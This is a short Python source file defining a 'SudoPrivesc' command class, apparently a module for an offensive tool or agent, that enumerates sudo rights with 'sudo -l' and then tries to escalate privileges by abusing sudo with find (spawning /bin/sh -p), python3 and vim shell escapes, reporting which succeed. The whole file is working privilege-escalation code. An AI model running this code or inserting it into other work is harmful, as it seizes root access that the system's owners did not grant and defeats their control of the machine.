from .abc import Command
import subprocess

class SudoPrivesc(Command):
    """Escalate privileges via sudo misconfiguration"""

    def do_command(self, lines: str, *args):
        results = []

        # Check what sudo commands are allowed without password
        result = subprocess.run(
            ["sudo", "-l"],
            capture_output=True, text=True
        )
        results.append("=== sudo -l output ===")
        results.append(result.stdout)
        results.append(result.stderr)

        # Try common SUID/sudo abuse vectors
        # Check if 'find' can be run with sudo (gtfobins classic)
        find_check = subprocess.run(
            ["sudo", "-n", "find", ".", "-exec", "/bin/sh", "-p", ";", "-quit"],
            capture_output=True, text=True
        )
        if find_check.returncode == 0:
            results.append("=== Escalated via find ===")
            results.append(find_check.stdout)
        
        # Check if 'python3' can be run with sudo
        python_check = subprocess.run(
            ["sudo", "-n", "python3", "-c", "import os; os.system('whoami')"],
            capture_output=True, text=True
        )
        if python_check.returncode == 0:
            results.append("=== Escalated via python3 ===")
            results.append(python_check.stdout)

        # Check if vim can be run with sudo
        vim_check = subprocess.run(
            ["sudo", "-n", "vim", "-c", ":!whoami", "-c", ":q!"],
            capture_output=True, text=True
        )
        if vim_check.returncode == 0:
            results.append("=== Escalated via vim ===")
            results.append(vim_check.stdout)

        return "\n".join(results)